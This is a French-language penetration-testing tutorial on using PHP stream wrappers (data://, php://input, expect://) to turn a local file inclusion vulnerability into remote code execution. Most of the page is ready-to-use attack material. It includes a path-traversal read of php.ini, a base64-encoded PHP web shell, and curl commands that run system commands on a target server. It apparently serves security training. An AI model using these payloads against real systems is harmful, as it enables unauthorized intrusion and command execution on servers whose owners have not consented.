# Wrappers PHP

***

## <mark style="color:red;">**Wrapper Data**</mark>

Le wrapper **data** peut être utilisé pour inclure des données externes, y compris du code PHP. Cependant, il n'est utilisable que si l'option **allow\_url\_include** est activée dans les configurations PHP. Vérifions tout d'abord si cette option est activée en lisant le fichier de configuration PHP à l'aide de la vulnérabilité LFI.

***

<mark style="color:green;">**Vérification des configurations PHP**</mark>

Pour cela, nous incluons le fichier de configuration PHP situé à **/etc/php/X.Y/apache2/php.ini** pour Apache ou **/etc/php/X.Y/fpm/php.ini** pour Nginx, où X.Y correspond à votre version PHP. Commencez par la dernière version, puis essayez les versions précédentes si le fichier n'est pas trouvé. Utilisez également le filtre **base64** pour éviter de casser le fichier, car les fichiers `.ini` sont similaires aux fichiers `.php`. Utilisez **cURL** ou **Burp Suite** plutôt qu’un navigateur, car la sortie peut être trop longue pour s'afficher correctement.

**Commande :**

{% code overflow="wrap" fullWidth="true" %}
```bash
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```
{% endcode %}

**Résultat extrait :**

```html
...SNIP...
allow_url_include = On
```

Si **allow\_url\_include** est activé, nous pouvons utiliser le wrapper **data**. Cela est important, car cette option n’est pas activée par défaut et est nécessaire pour plusieurs autres attaques LFI, comme celles utilisant le wrapper **input** ou les attaques RFI.

***

<mark style="color:green;">**Exécution de code à distance avec le wrapper Data**</mark>

Avec **allow\_url\_include** activé, utilisons le wrapper **data** pour inclure du code PHP. Encodez un shell PHP en base64 :

```bash
echo '<?php system($_GET["cmd"]); ?>' | base64
PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

Encodez ensuite cette chaîne en URL et passez-la au wrapper avec **data://text/plain;base64,**. Ajoutez une commande via le paramètre `cmd` :

{% code overflow="wrap" fullWidth="true" %}
```http
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```
{% endcode %}

**Avec cURL :**

{% code overflow="wrap" fullWidth="true" %}
```bash
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```
{% endcode %}

***

### <mark style="color:blue;">**Wrapper Input**</mark>

Le wrapper **input** inclut les données externes d’une requête POST et exécute du code PHP. Contrairement à **data**, les données sont passées dans le corps POST. La fonction vulnérable doit donc accepter des requêtes POST. Cela dépend aussi de **allow\_url\_include**.

**Exemple :**

{% code overflow="wrap" fullWidth="true" %}
```bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```
{% endcode %}

***

### <mark style="color:blue;">**Wrapper Expect**</mark>

Le wrapper **expect** exécute directement des commandes via des flux URL, sans besoin de shell. C'est un module externe qu'il faut installer et activer. Vérifiez son activation comme suit :

{% code overflow="wrap" fullWidth="true" %}
```bash
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
extension=expect
```
{% endcode %}

Si activé :

```bash
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```

***

{% hint style="warning" %}
**Résumé**

* **Data Wrapper :** Inclut des données externes encodées en base64.
* **Input Wrapper :** Requiert des données POST.
* **Expect Wrapper :** Exécute des commandes directement.

Ces techniques permettent une exécution de code via des vulnérabilités LFI. Les wrappers **phar** et **zip** seront abordés ultérieurement pour des applications autorisant l’upload de fichiers.
{% endhint %}
